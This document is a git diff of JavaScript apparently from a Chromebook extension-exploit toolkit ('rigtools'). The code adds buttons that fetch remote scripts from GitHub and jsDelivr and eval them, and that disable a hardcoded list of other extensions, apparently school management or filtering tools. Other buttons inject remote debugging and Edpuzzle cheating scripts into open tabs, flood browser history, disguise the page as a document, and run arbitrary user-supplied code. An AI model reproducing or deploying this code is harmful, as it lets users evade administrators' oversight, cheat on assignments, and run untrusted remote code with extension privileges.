@@ -686,8 +686,8 @@ onload = async function x() {
   document.open();
   this.document.write(htmlStyle);
   document.close();
+
   if (chrome.fileManagerPrivate) {
-    // alert(1);
     chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
     document.write(fileManagerPrivateTemplate);
     document.body.querySelector("#btn_FMP_openURL").onclick = function (ev) {};
@@ -695,110 +695,68 @@ onload = async function x() {
 
   if (chrome.management.setEnabled) {
     document.body.insertAdjacentHTML("beforeend", managementTemplate);
-    // createStyleTag();
     const extlist_element = document.querySelector(".extlist");
     await updateExtensionStatus(extlist_element);
-    const container_extensions = document.body.querySelector(
-      "#chrome_management_disable_ext"
-    );
-    // alert("loading button");
-    // alert(container_extensions.querySelector("button"));
-    /*
-    function unsafeEval() {
-      const manifest = chrome.runtime.getManifest();
-      return (
-        manifest &&
-        manifest.content_security_policy &&
-        manifest.content_security_policy.includes("unsafe-eval")
-      );
-    }
+    const container_extensions = document.body.querySelector("#chrome_management_disable_ext");
 
-    function addButtons() {
-      if (unsafeEval()) {
-        document.getElementById("eval-buttons").style.display = "block";
-      }
-    }
-
-    addButtons();
-    */
-
-    container_extensions.querySelector("#swamp").onclick = async function df(
-      e
-    ) {
-      fetch(
-        "https://raw.githubusercontent.com/T3M1N4L/rigtools-updated-ui/refs/heads/main/scripts/swamp-ultra.js"
-      )
+    container_extensions.querySelector("#swamp").onclick = async function df(e) {
+      fetch("https://raw.githubusercontent.com/T3M1N4L/rigtools-updated-ui/refs/heads/main/scripts/swamp-ultra.js")
         .then((res) => res.text())
         .then(eval);
     };
-    container_extensions.querySelector("#hstfld").onclick = async function df(
-      e
-    ) {
+
+    container_extensions.querySelector("#hstfld").onclick = async function df(e) {
       document.title = "Untitled Document";
-      var link = document.querySelector("link[rel~='icon']");
-      if (!link) {
-        link = document.createElement("link");
-        link.rel = "icon";
-        document.head.appendChild(link);
+      let link = document.querySelector("link[rel~='icon']") || document.createElement("link");
+      link.rel = "icon";
+      document.head.appendChild(link);
+      link.href = "https://raw.githubusercontent.com/htauk/rigtools-updated-ui/refs/heads/main/payloads/docs.ico";
+
+      let num = prompt("How Times Do You Want This Page To Show Up In your History?");
+      let done = false;
+      const x = window.location.href;
+      for (let i = 1; i <= num; i++) {
+        history.pushState(0, 0, i === num ? x : i.toString());
+        if (i === num) done = true;
       }
-      link.href =
-        "https://raw.githubusercontent.com/htauk/rigtools-updated-ui/refs/heads/main/payloads/docs.ico";
-      var num = prompt(
-        "How Times Do You Want This Page To Show Up In your History?"
-      );
-      done = false;
-      x = window.location.href;
-      for (var i = 1; i <= num; i++) {
-        history.pushState(0, 0, i == num ? x : i.toString());
-        if (i == num) {
-          done = true;
-        }
-      }
-      if (done === true) {
-        alert(
-          "Flooding Successful!\n " +
-            window.location.href +
-            " \nIs Now In Your History " +
-            num +
-            (num == 1 ? " time." : " Times.")
-        );
+      if (done) {
+        alert("Flooding Successful!\n " + window.location.href + " \nIs Now In Your History " + num + (num == 1 ? " time." : " Times."));
       }
     };
 
-    container_extensions.querySelector("#current-extension").onclick =
-      async function df(e) {
-        try {
-          var grabidtokill = chrome.runtime.id;
-          chrome.management.setEnabled(grabidtokill, false);
-        } catch {
-          alert("unsuccessful");
-        }
-      };
+    container_extensions.querySelector("#current-extension").onclick = async function df(e) {
+      try {
+        const grabidtokill = chrome.runtime.id;
+        chrome.management.setEnabled(grabidtokill, false);
+      } catch {
+        alert("unsuccessful");
+      }
+    };
 
-    container_extensions.querySelector("#rmv-cmn-blt").onclick =
-      async function df(e) {
-        try {
-          const bloatIds = [
-            "cgbbbjmgdpnifijconhamggjehlamcif",
-            "lfkbbmclnpaihpaajhohhfdjelchkikf",
-            "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
-            "pohmgobdeajemcifpoldnnhffjnnkhgf",
-            "becdplfalooflanipjoblcmpaekkbbhe",
-            "feepmdlmhplaojabeoecaobfmibooaid",
-            "adkcpkpghahmbopkjchobieckeoaoeem",
-            "haldlgldplgnggkjaafhelgiaglafanh",
-            "hpkdokakjglppeekfeekmebfahadnflp",
-          ];
+    container_extensions.querySelector("#rmv-cmn-blt").onclick = async function df(e) {
+      try {
+        const bloatIds = [
+          "cgbbbjmgdpnifijconhamggjehlamcif",
+          "lfkbbmclnpaihpaajhohhfdjelchkikf",
+          "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
+          "pohmgobdeajemcifpoldnnhffjnnkhgf",
+          "becdplfalooflanipjoblcmpaekkbbhe",
+          "feepmdlmhplaojabeoecaobfmibooaid",
+          "adkcpkpghahmbopkjchobieckeoaoeem",
+          "haldlgldplgnggkjaafhelgiaglafanh",
+          "hpkdokakjglppeekfeekmebfahadnflp",
+        ];
 
-          bloatIds.forEach((id) => {
-            chrome.runtime.getBackgroundPage(function (p) {
-              p.chrome.management.setEnabled(id, false);
-            });
+        bloatIds.forEach((id) => {
+          chrome.runtime.getBackgroundPage((p) => {
+            p.chrome.management.setEnabled(id, false);
           });
-        } catch {
-          alert("unsuccessful");
-        }
-      };
+        });
+      } catch {
+        alert("unsuccessful");
+      }
+    };
+
     // Declare a single listener for tab updates
     function listenerApp(callback) {
       chrome.tabs.onUpdated.addListener((id, changeInfo) => {
@@ -827,31 +785,28 @@ onload = async function x() {
           }
         });
       `;
-
-      // Execute the script in the tab
       chrome.tabs.executeScript(tabId, { code: eruda });
     }
 
     function runChii(tabId) {
       const chii = `
-    const script = document.createElement('script');
-    script.src = 'https://chii.liriliri.io/playground/target.js';
-    script.setAttribute('embedded', 'true');
-    document.head.appendChild(script);
-
-  `;
+        const script = document.createElement('script');
+        script.src = 'https://chii.liriliri.io/playground/target.js';
+        script.setAttribute('embedded', 'true');
+        document.head.appendChild(script);
+      `;
       chrome.tabs.executeScript(tabId, { code: chii });
     }
 
     function runEdpuzzle(tabId) {
       const edpuzzle = `
-    fetch("https://cdn.jsdelivr.net/gh/Miner49ur/shorthand@main/edpuzzlingscript.js").then(r => r.text()).then(r => {
-      if (!window.edpuzzlesLoaded) {
-        eval(r);
-        window.edpuzzlesLoaded = true;
-      }
-    });
-  `;
+        fetch("https://cdn.jsdelivr.net/gh/Miner49ur/shorthand@main/edpuzzlingscript.js").then(r => r.text()).then(r => {
+          if (!window.edpuzzlesLoaded) {
+            eval(r);
+            window.edpuzzlesLoaded = true;
+          }
+        });
+      `;
       chrome.tabs.executeScript(tabId, { code: edpuzzle });
     }
 
@@ -866,27 +821,21 @@ onload = async function x() {
 
     // Event listeners for buttons
     container_extensions.querySelector("#eruda").onclick = () => {
-      alert(
-        "Eruda is trying to load [make sure the extension your runnign this on is mv2, and has tabs permissions]... \nreload an already loaded website, or load in a new one!"
-      );
+      alert("Eruda is trying to load [make sure the extension you're running this on is mv2, and has tabs permissions]... \nreload an already loaded website, or load in a new one!");
       listenerApp((tab) => {
         runEruda(tab.id);
       });
     };
 
     container_extensions.querySelector("#chii").onclick = () => {
-      alert(
-        "Chii is trying to load [make sure the extension your runnign this on is mv2, and has tabs permissions]... \nreload an already loaded website, or load in a new one!"
-      );
+      alert("Chii is trying to load [make sure the extension you're running this on is mv2, and has tabs permissions]... \nreload an already loaded website, or load in a new one!");
       listenerApp((tab) => {
         runChii(tab.id);
       });
     };
 
     container_extensions.querySelector("#ed-hax").onclick = () => {
-      alert(
-        "Edpuzzle Hacks is trying to load [make sure the extension your runnign this on is mv2, and has tabs permissions]... \ngo to your edpuzzle assignment and check if it works!"
-      );
+      alert("Edpuzzle Hacks is trying to load [make sure the extension you're running this on is mv2, and has tabs permissions]... \ngo to your edpuzzle assignment and check if it works!");
       listenerApp((tab) => {
         if (tab.url.match(/edpuzzle\.com\/assignments/g)) {
           runEdpuzzle(tab.id);
@@ -910,56 +859,55 @@ onload = async function x() {
     document
       .querySelector("#code-run")
       .addEventListener("click", () => runCode(false));
-  }
+  } // End of management if statement
 
-  const runCode = async (onTab, tabId = "") => {
-    const codeTextarea = document.querySelector("#code");
-    let code = codeTextarea.value;
+}; // End of onload function
 
-    const outputDiv = document.querySelector("#code-output");
+const runCode = async (onTab, tabId = "") => {
+  const codeTextarea = document.querySelector("#code");
+  let code = codeTextarea.value;
 
-    if (onTab) {
-      code = `chrome.scripting.executeScript({
+  const outputDiv = document.querySelector("#code-output");
+
+  if (onTab) {
+    code = `chrome.scripting.executeScript({
       target: {tabId: ${tabId}},
       func: () => {${code}}
     });`;
-    }
+  }
 
-    try {
-      const originalLog = console.log;
-      console.log = (...args) => {
-        outputDiv.innerHTML += args.join(" ") + "<br>";
-      };
+  try {
+    const originalLog = console.log;
+    console.log = (...args) => {
+      outputDiv.innerHTML += args.join(" ") + "<br>";
+    };
 
-      const fs = await DefaultExtensionCapabilities.getFS();
-      function writeFile(file, data) {
-        return new Promise((resolve, reject) => {
-          fs.root.getFile(file, { create: true }, function (entry) {
-            entry.remove(function () {
-              fs.root.getFile(file, { create: true }, function (entry) {
-                entry.createWriter(function (writer) {
-                  writer.write(new Blob([data]));
-                  writer.onwriteend = resolve.bind(null, entry.toURL());
-                });
+    const fs = await DefaultExtensionCapabilities.getFS();
+    function writeFile(file, data) {
+      return new Promise((resolve, reject) => {
+        fs.root.getFile(file, { create: true }, function (entry) {
+          entry.remove(function () {
+            fs.root.getFile(file, { create: true }, function (entry) {
+              entry.createWriter(function (writer) {
+                writer.write(new Blob([data]));
+                writer.onwriteend = resolve.bind(null, entry.toURL());
               });
             });
           });
         });
-      }
-
-      const url = await writeFile("src.js", code);
-      let script =
-        document.body.querySelector("#evaluate_elem") ??
-        document.createElement("script");
-      script.remove();
-      script = document.createElement("script");
-      script.id = "evaluate_elem";
-      script.src = url;
-      document.body.appendChild(script);
-
-      console.log = originalLog;
-    } catch (error) {
-      outputDiv.innerHTML = `Error: ${error}`;
+      });
     }
-  };
+
+    const url = await writeFile("src.js", code);
+    let script = document.body.querySelector("#evaluate_elem") ?? document.createElement("script");
+    script.remove();
+    script = document.createElement("script");
+    script.id = "evaluate_elem";
+    script.src = url;
+    document.body.appendChild(script);
+
+    console.log = originalLog;
+  } catch (error) {
+    outputDiv.innerHTML = `Error: ${error}`;
+  }
 };
